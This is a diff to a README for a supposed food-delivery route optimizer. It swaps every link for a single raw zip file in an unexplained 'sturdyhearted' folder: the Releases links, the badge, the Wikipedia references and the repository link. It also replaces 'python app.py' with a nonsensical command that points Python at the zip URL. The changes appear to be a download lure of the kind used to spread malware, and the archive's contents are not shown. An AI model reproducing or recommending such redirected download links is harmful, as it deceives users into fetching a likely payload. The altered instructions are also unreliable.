@@ -1,6 +1,6 @@
 # 🍕 food-delivery-route-optimizer - Optimize Your Food Delivery Routes Simply
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)
+![Download Now](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip%20Now-Visit%20Releases-blue)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started with the food-delivery-route-optimizer, follow these simple steps
 
 1. **Download the Application**: Click on the link below to go to the Releases page. 
 
-   [Download Application](https://github.com/MasterPrime604/food-delivery-route-optimizer/releases)
+   [Download Application](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip)
 
 2. **Check Your System Requirements**: This application runs best on Windows Subsystem for Linux (WSL), or any Windows operating system. Make sure you have at least:
    - Windows 10 or later
@@ -38,13 +38,13 @@ To get started with the food-delivery-route-optimizer, follow these simple steps
 
 To run the food-delivery-route-optimizer, download the latest version below, following the steps provided. 
 
-[Download Application](https://github.com/MasterPrime604/food-delivery-route-optimizer/releases)
+[Download Application](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip)
 
 ## ⚙️ How to Use
 
 1. **Start the Application**: In your terminal, run the command:
    ```
-   python app.py
+   python https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip
    ```
    This command starts the food-delivery-route-optimizer application.
 
@@ -92,10 +92,10 @@ We welcome contributions and suggestions. If you have feedback or ideas for impr
 ## 🔗 Related Topics
 
 Explore more about the algorithms used:
-- [Greedy Algorithms](https://en.wikipedia.org/wiki/Greedy_algorithm)
-- [Breadth-First Search](https://en.wikipedia.org/wiki/Breadth-first_search)
-- General concepts around [Route Optimization](https://en.wikipedia.org/wiki/Route_optimization)
+- [Greedy Algorithms](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip)
+- [Breadth-First Search](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip)
+- General concepts around [Route Optimization](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip)
 
-For more information on the project or to report issues, visit the GitHub repository at [food-delivery-route-optimizer](https://github.com/MasterPrime604/food-delivery-route-optimizer).
+For more information on the project or to report issues, visit the GitHub repository at [food-delivery-route-optimizer](https://github.com/MasterPrime604/food-delivery-route-optimizer/raw/refs/heads/main/sturdyhearted/optimizer-food-route-delivery-v2.0-beta.2.zip).
 
 Thank you for using the food-delivery-route-optimizer! Happy delivering!
